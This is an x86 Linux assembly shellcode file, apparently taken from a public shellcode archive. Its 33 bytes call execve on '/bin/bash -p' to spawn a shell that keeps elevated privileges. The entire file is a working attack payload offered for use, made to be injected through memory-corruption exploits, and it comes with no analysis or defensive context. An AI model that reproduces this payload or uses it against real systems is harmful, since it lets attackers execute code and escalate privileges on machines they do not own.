;Title: 	Linux x86 - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes
;Author:	Jonathan Salwan
;http://www.shell-storm.org/shellcode/files/shellcode-606.php

global _start 
 
section .text 
_start:
	push byte 0xb
	pop eax
	cdq
	push edx		
	push word 0x702d	;"-p"
	mov ecx,esp		
	push edx
	push byte 0x68		;"h"
	push dword 0x7361622f	;"/bas"
	push dword 0x6e69622f	;"/bin"
	mov ebx,esp
	push edx
	push ecx
	push ebx
	mov ecx,esp
	int 0x80
